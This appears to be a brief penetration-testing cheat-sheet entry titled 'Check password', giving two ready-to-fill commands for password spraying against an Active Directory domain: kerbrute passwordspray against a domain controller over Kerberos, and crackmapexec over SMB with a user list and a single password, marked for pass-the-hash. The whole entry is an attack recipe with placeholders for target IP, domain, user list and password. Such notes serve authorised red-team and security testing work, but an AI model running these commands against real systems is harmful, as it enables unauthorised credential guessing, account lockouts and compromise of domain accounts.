# Check password
Check password against users in list:
```bash
# Kerberos
kerbrute passwordspray --dc <IP> -d '<DOMAIN>' -v <USERLIST> '<PASS>'

# SMB
crackmapexec smb <IP> -u <USERLIST> -p '<PASS>' # PTH
```